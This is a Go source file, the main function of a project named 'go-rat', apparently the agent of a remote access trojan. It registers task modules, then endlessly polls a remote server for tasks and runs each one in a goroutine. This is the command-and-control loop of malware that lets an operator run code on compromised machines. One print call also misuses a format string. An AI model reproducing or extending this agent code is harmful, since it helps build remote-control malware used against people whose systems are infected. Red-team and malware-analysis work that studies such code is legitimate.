package main

import (
	"fmt"
	"go-rat/agent/modules"
	"go-rat/utils/net"
	"go-rat/utils/types"
	"time"
)

func main() {
	// Register modules
	modules.InitRegistry()

	for {
		// Get Tasks
		tasks, err := net.GetTasks("1")
		if err != nil {
			fmt.Println("Error getting tasks. " + err.Error())
		}
		for _, task := range tasks {
			// Run task in a go routine
			go func(task types.Task) {
				if _, err := modules.Register.ExecuteModule(task); err != nil {
					fmt.Println("Error running task: '%s'. "+err.Error(), task.ID)
				}
			}(task)
		}

		// Wait 5 seconds for long-polling
		time.Sleep(5 * time.Second)
	}
}
